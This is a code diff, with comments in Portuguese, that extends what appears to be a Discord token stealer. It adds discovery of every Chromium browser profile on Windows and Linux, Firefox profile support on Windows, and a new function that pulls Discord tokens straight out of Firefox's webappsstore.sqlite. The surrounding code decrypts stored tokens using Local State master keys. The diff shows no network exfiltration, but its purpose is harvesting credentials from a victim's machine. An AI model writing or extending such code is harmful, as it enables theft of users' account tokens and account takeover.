@@ -49,6 +49,41 @@ function getSearchPaths() {
   return getWindowsSearchPaths();
 }
 
+/**
+ * Descobre todos os perfis de um navegador Chromium (Default, Profile 1, Profile 2, etc.)
+ * Retorna array de { profileName, leveldb, localState }.
+ */
+function discoverChromiumProfiles(browserName, userDataDir) {
+  const results = [];
+  const localState = path.join(userDataDir, 'Local State');
+
+  if (!fs.existsSync(userDataDir)) return results;
+
+  try {
+    const entries = fs.readdirSync(userDataDir);
+    for (const entry of entries) {
+      // Perfis válidos: "Default", "Profile 1", "Profile 2", etc.
+      if (entry !== 'Default' && !entry.startsWith('Profile ')) continue;
+      const leveldb = path.join(userDataDir, entry, 'Local Storage', 'leveldb');
+      if (fs.existsSync(leveldb)) {
+        const label = entry === 'Default' ? browserName : `${browserName} (${entry})`;
+        results.push({ name: label, leveldb, localState });
+      }
+    }
+  } catch (_) {}
+
+  // Se nenhum perfil encontrado, tenta o Default de qualquer forma
+  if (results.length === 0) {
+    results.push({
+      name: browserName,
+      leveldb: path.join(userDataDir, 'Default', 'Local Storage', 'leveldb'),
+      localState,
+    });
+  }
+
+  return results;
+}
+
 function getWindowsSearchPaths() {
   const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
   const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
@@ -70,22 +105,12 @@ function getWindowsSearchPaths() {
       leveldb: path.join(appData, 'discordcanary', 'Local Storage', 'leveldb'),
       localState: path.join(appData, 'discordcanary', 'Local State'),
     },
-    // ===== Navegadores (Chromium-based) =====
-    {
-      name: 'Google Chrome',
-      leveldb: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Local State'),
-    },
-    {
-      name: 'Microsoft Edge',
-      leveldb: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Local State'),
-    },
-    {
-      name: 'Brave',
-      leveldb: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
-    },
+    // ===== Navegadores (Chromium-based) - múltiplos perfis =====
+    ...discoverChromiumProfiles('Google Chrome', path.join(localAppData, 'Google', 'Chrome', 'User Data')),
+    ...discoverChromiumProfiles('Microsoft Edge', path.join(localAppData, 'Microsoft', 'Edge', 'User Data')),
+    ...discoverChromiumProfiles('Brave', path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data')),
+    ...discoverChromiumProfiles('Vivaldi', path.join(localAppData, 'Vivaldi', 'User Data')),
+    // Opera não usa o padrão "User Data/Default"
     {
       name: 'Opera',
       leveldb: path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
@@ -95,11 +120,6 @@ function getWindowsSearchPaths() {
       name: 'Opera GX',
       leveldb: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
       localState: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local State'),
-    },
-    {
-      name: 'Vivaldi',
-      leveldb: path.join(localAppData, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(localAppData, 'Vivaldi', 'User Data', 'Local State'),
     },
   ];
 }
@@ -137,55 +157,46 @@ function getLinuxSearchPaths() {
       leveldb: path.join(home, 'snap', 'discord', 'current', '.config', 'discord', 'Local Storage', 'leveldb'),
       localState: path.join(home, 'snap', 'discord', 'current', '.config', 'discord', 'Local State'),
     },
-    // ===== Navegadores (Chromium-based - Linux) =====
-    {
-      name: 'Google Chrome',
-      leveldb: path.join(configDir, 'google-chrome', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(configDir, 'google-chrome', 'Local State'),
-    },
-    {
-      name: 'Google Chrome (Flatpak)',
-      leveldb: path.join(home, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(home, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome', 'Local State'),
-    },
-    {
-      name: 'Chromium',
-      leveldb: path.join(configDir, 'chromium', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(configDir, 'chromium', 'Local State'),
-    },
-    {
-      name: 'Microsoft Edge',
-      leveldb: path.join(configDir, 'microsoft-edge', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(configDir, 'microsoft-edge', 'Local State'),
-    },
-    {
-      name: 'Brave',
-      leveldb: path.join(configDir, 'BraveSoftware', 'Brave-Browser', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(configDir, 'BraveSoftware', 'Brave-Browser', 'Local State'),
-    },
+    // ===== Navegadores (Chromium-based - Linux) - múltiplos perfis =====
+    ...discoverChromiumProfiles('Google Chrome', path.join(configDir, 'google-chrome')),
+    ...discoverChromiumProfiles('Google Chrome (Flatpak)', path.join(home, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome')),
+    ...discoverChromiumProfiles('Chromium', path.join(configDir, 'chromium')),
+    ...discoverChromiumProfiles('Microsoft Edge', path.join(configDir, 'microsoft-edge')),
+    ...discoverChromiumProfiles('Brave', path.join(configDir, 'BraveSoftware', 'Brave-Browser')),
+    ...discoverChromiumProfiles('Vivaldi', path.join(configDir, 'vivaldi')),
+    // Opera não usa o padrão "User Data/Default" no Linux
     {
       name: 'Opera',
       leveldb: path.join(configDir, 'opera', 'Local Storage', 'leveldb'),
       localState: path.join(configDir, 'opera', 'Local State'),
     },
-    {
-      name: 'Vivaldi',
-      leveldb: path.join(configDir, 'vivaldi', 'Default', 'Local Storage', 'leveldb'),
-      localState: path.join(configDir, 'vivaldi', 'Local State'),
-    },
-    // ===== Firefox (Linux) - usa perfis em profiles.ini =====
+    // ===== Firefox (Linux) - usa perfis e IndexedDB =====
     ...getFirefoxPaths(),
   ];
 }
 
 /**
- * Procura diretórios de perfil do Firefox no Linux.
- * Firefox armazena tokens no localStorage do IndexedDB, não em LevelDB.
- * Procuramos nos ficheiros de storage do webappsstore.
+ * Procura diretórios de perfil do Firefox.
+ * Suporta Linux (~/.mozilla/firefox) e Windows (%APPDATA%/Mozilla/Firefox).
+ *
+ * Firefox armazena localStorage no ficheiro webappsstore.sqlite.
+ * Se better-sqlite3 estiver instalado, lê diretamente do SQLite.
+ * Caso contrário, faz fallback para scan de ficheiros por regex.
  */
 function getFirefoxPaths() {
   const home = os.homedir();
-  const firefoxDir = path.join(home, '.mozilla', 'firefox');
+  let firefoxDir;
+
+  if (isWindows) {
+    const appData = process.env.APPDATA || path.join(home, 'AppData', 'Roaming');
+    firefoxDir = path.join(appData, 'Mozilla', 'Firefox', 'Profiles');
+    // No Windows, os perfis estão em "Profiles" ou diretamente no diretório pai
+    if (!fs.existsSync(firefoxDir)) {
+      firefoxDir = path.join(appData, 'Mozilla', 'Firefox');
+    }
+  } else {
+    firefoxDir = path.join(home, '.mozilla', 'firefox');
+  }
 
   if (!fs.existsSync(firefoxDir)) return [];
 
@@ -193,12 +204,29 @@ function getFirefoxPaths() {
   try {
     const entries = fs.readdirSync(firefoxDir);
     for (const entry of entries) {
-      // Perfis do Firefox terminam em .default, .default-release, etc.
       if (!entry.includes('.')) continue;
       const profilePath = path.join(firefoxDir, entry);
+
+      try {
+        const stat = fs.statSync(profilePath);
+        if (!stat.isDirectory()) continue;
+      } catch (_) { continue; }
+
+      // 1. Tentar ler via webappsstore.sqlite (mais fiável)
+      const webappStore = path.join(profilePath, 'webappsstore.sqlite');
+      if (fs.existsSync(webappStore)) {
+        results.push({
+          name: `Firefox (${entry})`,
+          leveldb: null, // Será tratado pelo scan de SQLite
+          localState: null,
+          firefoxSqlite: webappStore,
+        });
+        continue;
+      }
+
+      // 2. Fallback: scan do storage/default do Firefox
       const storagePath = path.join(profilePath, 'storage', 'default');
       if (fs.existsSync(storagePath)) {
-        // Procurar pelo diretório do discord.com no storage do Firefox
         try {
           const storageDirs = fs.readdirSync(storagePath);
           for (const dir of storageDirs) {
@@ -208,7 +236,7 @@ function getFirefoxPaths() {
                 results.push({
                   name: `Firefox (${entry})`,
                   leveldb: lsDir,
-                  localState: null, // Firefox não usa Local State
+                  localState: null,
                 });
               }
             }
@@ -219,6 +247,53 @@ function getFirefoxPaths() {
   } catch (_) {}
 
   return results;
+}
+
+/**
+ * Lê tokens do Firefox diretamente do ficheiro webappsstore.sqlite via better-sqlite3.
+ * Procura entradas com scope de discord.com no localStorage do Firefox.
+ */
+function findTokensInFirefoxSqlite(sqlitePath) {
+  const tokens = new Set();
+
+  let Database;
+  try {
+    Database = require('better-sqlite3');
+  } catch (_) {
+    // better-sqlite3 não está instalado, retorna vazio
+    return tokens;
+  }
+
+  try {
+    // Abrir em modo read-only para não interferir com o Firefox
+    const db = new Database(sqlitePath, { readonly: true, fileMustExist: true });
+
+    try {
+      // webappsstore.sqlite tem a tabela "webappsstore2"
+      // colunas: originAttributes, originKey, scope, key, value
+      // O scope do Discord é algo como "moc.drocsid.:https:443"
+      const rows = db.prepare(
+        "SELECT key, value FROM webappsstore2 WHERE scope LIKE '%drocsid%' OR originKey LIKE '%discord.com%'"
+      ).all();
+
+      for (const row of rows) {
+        const content = `${row.key || ''} ${row.value || ''}`;
+        for (const pattern of PLAIN_TOKEN_PATTERNS) {
+          pattern.lastIndex = 0;
+          let match;
+          while ((match = pattern.exec(content)) !== null) {
+            tokens.add(match[0]);
+          }
+        }
+      }
+    } finally {
+      db.close();
+    }
+  } catch (_) {
+    // Ficheiro bloqueado pelo Firefox ou corrompido - normal
+  }
+
+  return tokens;
 }
 
 // ====================== DECRYPTION (Windows DPAPI + Linux Keyring) ======================
@@ -470,15 +545,23 @@ function findAllTokens() {
   const searchPaths = getSearchPaths();
 
   for (const location of searchPaths) {
-    // Obter a chave mestre para desencriptar tokens (se disponível)
-    let masterKey = null;
-    if (location.localState) {
-      masterKey = getMasterKey(location.localState);
+    let foundTokens;
+
+    if (location.firefoxSqlite) {
+      // Firefox com SQLite - usar leitura direta do webappsstore.sqlite
+      foundTokens = findTokensInFirefoxSqlite(location.firefoxSqlite);
+    } else if (location.leveldb) {
+      // Chromium/Discord - usar scan de LevelDB
+      let masterKey = null;
+      if (location.localState) {
+        masterKey = getMasterKey(location.localState);
+      }
+      foundTokens = findTokensInDirectory(location.leveldb, masterKey);
+    } else {
+      continue;
     }
 
-    const tokens = findTokensInDirectory(location.leveldb, masterKey);
-
-    for (const token of tokens) {
+    for (const token of foundTokens) {
       if (seenTokens.has(token)) continue;
       seenTokens.add(token);
 
